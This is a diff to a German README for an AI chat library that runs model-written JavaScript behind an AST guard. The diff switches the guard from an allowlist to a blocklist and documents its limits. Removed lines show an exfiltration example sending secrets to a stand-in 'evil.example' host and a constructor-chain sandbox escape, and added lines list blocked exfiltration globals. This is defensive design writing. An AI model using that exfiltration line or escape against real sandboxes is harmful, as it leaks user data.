@@ -15,7 +15,7 @@ API, API-Beschreibung, Instructions.
 | Feature                         | Was es bedeutet                                                                                                                   |
 | ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
 | **evaluate-Pattern**            | Ein einziges Tool statt 20 Tool-Schemas. Das Modell schreibt JavaScript gegen deine API — mit Schleifen, Filtern, Aggregation.    |
-| **AST-Guard (Allowlist)**       | Jeder generierte Code wird vor der Ausführung statisch geprüft. Unbekannte Globale werden abgelehnt, nicht nur bekannte verboten. |
+| **AST-Guard**                   | Jeder generierte Code wird vor der Ausführung statisch geprüft — Sandbox-Escapes und Exfiltrationskanäle fliegen raus, bevor ein Statement läuft.  |
 | **UI-Awareness**                | Der Agent sieht die sichtbare Oberfläche (`data-*`-Attribute) und kann Buttons klicken, Felder füllen, Optionen wählen.           |
 | **Runtime-Types**               | Die API-Beschreibung wird vor jedem Turn mit echten Werten angereichert: `status: string` → `status: "todo" \| "done"`.           |
 | **Token-Streaming**             | Antworten erscheinen Token für Token; Tool-Calls werden live sichtbar.                                                            |
@@ -101,7 +101,7 @@ sequenceDiagram
     P->>P: Auth-Hook, Rate-Limit, Model-Allowlist
     P->>M: + echter API-Key
     M-->>H: Tool-Call evaluate({ code })
-    H->>G: guardCode(code, apiNames)
+    H->>G: guardCode(code)
     alt Code unsicher
         G-->>H: abgelehnt + Begründung
         H-->>M: "Rejected (Zeile 2): fetch ist nicht verfügbar"
@@ -127,7 +127,7 @@ Tool-Loop da.
 | `server/providers.go`              | Provider-Registry (Base-URL, Auth-Stil, wo das Modell im Request steht)                          |
 | `server/ratelimit.go`              | Fixed-Window-Limiter pro Client                                                                  |
 | `server/cmd/aichat-proxy/`         | Standalone-Binary für die lokale Entwicklung                                                     |
-| `web/src/core/guard.ts`            | **Die Sicherheitsgrenze.** AST-Analyse mit scope-bewusster Allowlist                             |
+| `web/src/core/guard.ts`            | AST-Prüfung des generierten Codes: Escapes und Exfiltrationskanäle, scope-bewusst               |
 | `web/src/core/evaluator.ts`        | Der Executor mit den 5 Schichten                                                                 |
 | `web/src/core/runtimeTypes.ts`     | `@values`-Annotationen → konkrete Union-Typen                                                    |
 | `web/src/core/roundValues.ts`      | Zahlen runden, bevor sie ins Kontextfenster wandern                                              |
@@ -196,7 +196,7 @@ const evaluate = createEvaluator({
   rateWindowMs: 60_000,
   timeoutMs: 30_000,          // ④ Timeout
   maxResultLength: 50_000,    // ⑤ Ergebnis kürzen
-  extraGlobals: ["dayjs"],    // bewusst zusätzlich erlaubte Globale
+  extraBlocked: ["APP"],      // ③ eigene Globale zusätzlich sperren
 });
 ```
 
@@ -209,7 +209,7 @@ flowchart TD
     L1 -- ok --> L2{2. Rate-Limit}
     L2 -- zu viele Calls --> Err
     L2 -- ok --> L3{3. Guard: AST-Analyse}
-    L3 -- unbekannter Globaler / Escape --> Err
+    L3 -- Escape / Exfiltrationskanal --> Err
     L3 -- sicher --> L4[4. Ausführung mit Timeout]
     L4 -- Laufzeitfehler --> Err
     L4 --> L5[5. Ergebnis kürzen]
@@ -221,56 +221,58 @@ flowchart TD
 
 Der Code läuft in `with (api) { … }`. Das ist **Ergonomie, keine Sicherheit**: `with` macht die
 API-Funktionen ohne Präfix aufrufbar — aber jeder Bezeichner, den `api` *nicht* kennt, fällt
-durch auf den echten globalen Scope. Die Sicherheit liegt vollständig in Schicht 3.
+durch auf den echten globalen Scope. Schicht 3 fängt die Konstrukte ab, mit denen man das
+ausnutzen würde.
 
 Wichtig: Ein abgelehnter Code wird **nie teilweise ausgeführt**. Die Prüfung passiert vor dem
 ersten Statement.
 
 ### Der Guard im Detail
 
-`guard.ts` parst den Code mit acorn und geht den AST scope-bewusst durch. Ein Bezeichner ist
-nur dann erlaubt, wenn er sich auflösen lässt gegen:
+`guard.ts` parst den Code mit acorn und prüft den AST gegen drei Blocklisten. Er **kennt deine
+API nicht** — und muss sie nicht kennen: Er beschränkt *Sprachkonstrukte*, nicht das Vokabular
+deiner Anwendung.
 
-1. **die lexikalischen Scopes des Codes selbst** (`const`, `let`, `var`, Parameter, Funktionsnamen,
-   `catch`-Parameter, Destructuring, Hoisting inklusive),
-2. **die Keys deines API-Objekts** (die kommen aus dem `with`),
-3. **eine kleine Liste reiner Built-ins**: `Math`, `JSON`, `Object`, `Array`, `String`, `Number`,
-   `Boolean`, `Date`, `RegExp`, `Map`, `Set`, `Promise`, `console`, `parseInt`, … — nichts davon
-   erreicht Netzwerk, DOM, Storage oder das Modulsystem.
+| Liste | Was sie blockiert | Beispiele |
+| --- | --- | --- |
+| **Knotentypen** | Konstrukte, die den Scope umgehen | `this` (→ `globalThis`), `import()`, `import.meta`, `with`, Tagged Templates, `debugger` |
+| **Bezeichner** | Namen, die aus der App hinausführen | `eval`, `Function`, `arguments`, `Proxy`, `Reflect`, `window`, `document`, `location`, `navigator`, `fetch`, `XMLHttpRequest`, `WebSocket`, `Image`, `Worker`, `open`, `localStorage`, `setTimeout`, `alert`, `require`, … |
+| **Properties** | Zugriffe entlang der Prototype-Chain | `.constructor`, `.prototype`, `.__proto__`, `getPrototypeOf`, `__defineGetter__`, … |
 
-**Alles andere ist eine freie Referenz auf einen unbekannten Globalen — und wird abgelehnt.**
+#### Warum Blocklist und nicht Allowlist
 
-#### Warum Allowlist und nicht Blocklist
+Die naheliegende Alternative wäre eine Allowlist: Jeder Bezeichner muss sich gegen die Keys des
+API-Objekts plus ein paar Built-ins auflösen lassen, alles andere fliegt raus. Das ist strenger
+— **unbekannte Globale scheitern dann geschlossen** — aber es setzt voraus, dass der Guard die
+Namen der API kennt. In einer echten Anwendung kennt er sie nicht:
 
-Eine Blocklist gefährlicher Namen (`window`, `document`, `fetch`, `eval`, …) wird nie fertig.
-Jeder Globale, an den niemand gedacht hat, ist eine offene Tür:
+* Die API ist ein **tiefer Objektbaum** (`kernel.model.features[i].params`), keine flache
+  Funktionsliste.
+* Sie entsteht **zur Laufzeit**, wächst während der Session oder liegt hinter Gettern und
+  Proxies — `Object.keys(api)` ist in dem Moment unvollständig, in dem man es aufruft.
+
+Eine Allowlist, die die echte Fläche nicht kennt, lehnt **legitime Aufrufe** ab. Und ein Guard,
+der die eigene API der App blockiert, ist schlimmer als nutzlos: Das Modell kommt nicht weiter,
+und der Reflex des Entwicklers ist, den Guard aufzuweichen.
+
+Deshalb beschränkt der Guard die Sprache und nicht das Vokabular — und die Sicherheitsgrenze
+rückt dorthin, wo sie ohnehin hingehört: **an das API-Objekt.** Siehe „Grenzen".
+
+#### Ein geblockter Name meint nur den *Globalen* dieses Namens
+
+`open`, `parent`, `top`, `self` sind ganz normale Variablennamen. Der Guard verfolgt deshalb die
+lexikalischen Scopes (`const`/`let`/`var`, Parameter, Destructuring, Hoisting, `catch`) und
+schlägt nur bei **freien** Referenzen an:
 
 ```js
-new Image().src = "https://evil.example/?" + JSON.stringify(secret);  // kein verbotener Name dabei
+const open = listTasks().filter((t) => !t.done);   // ✅ lokale Variable, kein window.open
+const parent = node.parent;                        // ✅
+return task.location;                              // ✅ Property, kein globales location
+return open;                                       // ❌ frei → der echte Globale
 ```
 
-`Image` steht auf keiner üblichen Blocklist — und exfiltriert trotzdem Daten. Dasselbe gilt für
-`XMLHttpRequest`, `open`, `atob`, `Notification`, `navigator.sendBeacon` und den Rest der
-Plattform. Bei der Allowlist ist das kein Wettrennen: Was nicht bekannt ist, fliegt raus.
-**Unbekannte Namen scheitern geschlossen.**
-
-Der Preis wäre theoretisch, dass legitimer Code abgelehnt wird — praktisch nicht, weil
-*Sprachkonstrukte* nicht eingeschränkt sind: Schleifen, `async`/`await`, Destructuring,
-Template-Literals, Closures, `try`/`catch`, Array-Methoden sind alle erlaubt. Beschränkt sind
-nur die *freien Namen*.
-
-#### Zusätzlich blockiert
-
-Escapes, die mit erlaubten Namen auskommen:
-
-| Konstrukt                                                      | Warum                                                               |
-| -------------------------------------------------------------- | ------------------------------------------------------------------- |
-| `this`                                                         | wird in sloppy mode zu `globalThis`                                 |
-| `.constructor`                                                 | `[].constructor.constructor("return globalThis")()` — der Klassiker |
-| `.prototype`, `.__proto__`, `getPrototypeOf`, `defineProperty` | Prototype-Walking und -Pollution                                    |
-| `import()`, `import.meta`, `new.target`                        | Modulsystem                                                         |
-| `with`, Tagged Templates, `debugger`                           | kein legitimer Nutzen, zusätzliche Angriffsfläche                   |
-| berechneter Zugriff aus Ausdrücken                             | Verschleierung, siehe unten                                         |
+Ohne diese Unterscheidung würde der Guard alltäglichen Code ablehnen — genau der Fehlermodus, der
+dazu führt, dass man einen Guard am Ende abschaltet.
 
 #### Computed Access
 
@@ -285,37 +287,56 @@ task[fn()];                     // ❌ Funktionsaufruf als Key
 ```
 
 Ein Key, der erst zur Laufzeit entsteht, kann alles buchstabieren — also ist nur erlaubt, was
-sich statisch lesen lässt.
+sich statisch lesen lässt. Braucht das Modell wirklich einen dynamischen Lookup über einen
+Objektbaum, gib ihm dafür eine API-Funktion (`getProperty(obj, name)`), die den Namen prüft.
 
 #### Fehlermeldungen sind für das Modell geschrieben
 
 ```
-Rejected (Zeile 3, Spalte 12): "fetch" ist nicht verfügbar. Verwende nur die
-dokumentierten API-Funktionen, lokale Variablen und Standard-Built-ins.
+Rejected (Zeile 3, Spalte 12): "fetch" is not allowed. Use only the documented
+API functions and plain JavaScript.
 ```
 
 Diese Meldung geht zurück ans Modell. Es liest sie, schreibt den Code um und versucht es erneut
 — ohne dass der Nutzer etwas davon merkt.
 
+#### Anpassen
+
+```ts
+createEvaluator({
+  api,
+  extraBlocked: ["APP", "KERNEL"],   // eigene Globale zusätzlich sperren
+  allowBlocked: ["setTimeout"],      // im Ausnahmefall wieder freigeben
+});
+```
+
 #### Testabdeckung
 
 `guard.test.ts` deckt legitime Muster ab, die das Modell tatsächlich schreibt (Schleifen,
-Destructuring, async, verschachtelte Scopes), dazu Sandbox-Escapes, unbekannte Globale,
-Exfiltrationsversuche, Obfuscation, Scope-Shadowing und die Limits. Zusammen mit Evaluator,
-Runtime-Types und UI-Helfern: **49 Unit-Tests**, plus 11 Proxy-Tests auf Go-Seite.
+Destructuring, async, tiefe und dynamische API-Bäume), dazu Sandbox-Escapes, jeden
+Exfiltrationskanal, Obfuscation, Scope-Shadowing und die Limits. Zusammen mit Evaluator,
+Runtime-Types und UI-Helfern: **53 Unit-Tests**, plus 11 Proxy-Tests auf Go-Seite.
 
 ### Grenzen — was der Guard *nicht* leistet
 
-Der Code teilt sich den Main-Thread mit der App, weil er synchronen Zugriff auf Store und DOM
-braucht. Daraus folgen zwei ehrliche Einschränkungen:
+Sei hier ehrlich mit dir selbst, sonst baust du auf einer Illusion:
 
-* **Endlosschleifen frieren den Tab ein.** Der Timeout greift nur bei asynchronen Hängern —
-  `while (true) {}` läuft im selben Thread wie der Timer. Ein Web Worker würde das lösen und
-  gleichzeitig den DOM-Zugriff kosten, der der ganze Punkt ist.
-* **Die API ist die eigentliche Sicherheitsgrenze.** Der Guard sorgt dafür, dass nur *deine*
-  Funktionen erreichbar sind. Was diese Funktionen dürfen, entscheidest du.
-  **Nimm nichts in die API auf, was du dem Nutzer nicht auch selbst erlauben würdest.**
-  Destruktives (Löschen, Bezahlen, Versenden) gehört hinter eine Rückfrage.
+* **Eine Blocklist ist konstruktionsbedingt unvollständig.** Jeder Globale, an den niemand
+  gedacht hat, ist erreichbar. Der Guard ist eine belastbare Barriere gegen ein Modell, das
+  entgleist — **keine Sandbox, die einen Angreifer einsperrt.**
+* **Die API ist die eigentliche Sicherheitsgrenze.** Der Guard hält den Code davon ab, aus der
+  API *auszubrechen*. Was die API *darf*, entscheidest du.
+  **Nimm nichts hinein, was du dem Nutzer nicht auch selbst erlauben würdest.** Destruktives
+  (Löschen, Bezahlen, Versenden) gehört hinter eine Rückfrage — und `onAfterRun` an einen
+  Undo-Checkpoint, damit ein missratener Turn ein Ctrl+Z ist.
+* **Jeder andere Ausführungspfad in deiner App führt am Guard vorbei.** Hat deine Anwendung eine
+  Skriptsprache, ein Plugin-System oder sonst irgendetwas, das Code ausführt, und darf das Modell
+  darauf schreiben, dann ist der Guard dort schlicht nicht zuständig. Schick solchen Code
+  ebenfalls durch `guardCode()` — oder lass ihn nur nach ausdrücklicher Bestätigung des Nutzers
+  laufen.
+* **Endlosschleifen frieren den Tab ein.** Der Code teilt sich den Main-Thread mit der App (er
+  braucht synchronen Zugriff auf Store und DOM). Der Timeout greift nur bei asynchronen Hängern —
+  `while (true) {}` läuft im selben Thread wie der Timer.
 
 ***
 
@@ -836,7 +857,7 @@ export const agentOptions = (): ChatAgentOptions => {
 ```bash
 cd server && go test -race ./...     # 11 Tests: Key-Injection, Allowlist, Rate-Limit,
                                      # Body-Limit, Traversal, Auth-Hook, SSE-Flushing
-cd web    && npx vitest run          # 49 Tests: Guard, Evaluator, Runtime-Types, UI-Helfer
+cd web    && npx vitest run          # 53 Tests: Guard, Evaluator, Runtime-Types, UI-Helfer
 cd web    && npx tsc --noEmit        # Typecheck der Lib
 ```
 
@@ -871,12 +892,18 @@ Tool-Call-Struktur. Ein eigenes Backend-Protokoll müsste all das nachbauen — 
 Provider-Änderung nachziehen. Der Proxy hat genau eine Aufgabe: den Key injizieren und die
 Leitplanken durchsetzen.
 
-### Warum Allowlist statt Blocklist im Guard?
+### Warum Blocklist statt Allowlist im Guard?
 
-Weil eine Blocklist prinzipiell unvollständig ist. `new Image().src = "https://evil/?" + data`
-enthält keinen einzigen typischerweise verbotenen Namen. Was zählt, ist nicht, ob die gefährlichen
-Namen alle gelistet sind, sondern ob unbekannte Namen **geschlossen scheitern**. Die
-Sprachkonstrukte bleiben dabei frei — beschränkt sind nur freie Bezeichner.
+Eine Allowlist (nur API-Keys und ein paar Built-ins sind gültige Namen) wäre sicherer: Unbekannte
+Globale scheitern dann geschlossen. Sie **setzt aber voraus, dass der Guard die Namen der API
+kennt** — und in einer echten App ist die API ein tiefer, zur Laufzeit wachsender Objektbaum,
+teils hinter Gettern und Proxies. `Object.keys(api)` ist dann schon in dem Moment unvollständig,
+in dem man es aufruft, und der Guard blockiert die eigene Anwendung.
+
+Ein Guard, der legitime Aufrufe ablehnt, wird abgeschaltet — und dann schützt er gar nichts mehr.
+Also beschränkt er die Sprache statt des Vokabulars, und die Sicherheitsgrenze liegt bewusst am
+API-Objekt. Der Preis ist explizit: Die Blocklist ist unvollständig, und wer einen echten
+Angreifer im Kontext hat (Prompt-Injection), darf sich nicht auf sie verlassen.
 
 ### Warum `streamText()` und nicht `generateText()`?
 
